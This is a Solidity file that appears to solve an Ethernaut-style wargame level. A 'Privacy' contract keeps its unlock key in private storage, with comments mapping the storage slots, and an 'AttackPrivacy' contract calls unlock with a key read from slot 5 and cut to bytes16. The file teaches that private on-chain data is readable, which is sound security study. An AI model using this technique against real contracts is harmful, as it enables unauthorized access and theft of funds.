// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true; // 0x0   [1 byte]
    uint256 public ID = block.timestamp; // 0x1 [32 bytes]
    uint8 private flattening = 10; // 0x2   [1 byte]
    uint8 private denomination = 255; // 0x2    [1 byte]
    uint16 private awkwardness = uint16(block.timestamp); // 0x2    [2 bytes]
    bytes32[3] private data; // 0x3, 0x4, 0x5

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

contract AttackPrivacy {
    Privacy privacy;

    function attack(address _privacy, bytes32 _data) public {
        privacy = Privacy(_privacy);

        privacy.unlock(bytes16(_data));
    }
}
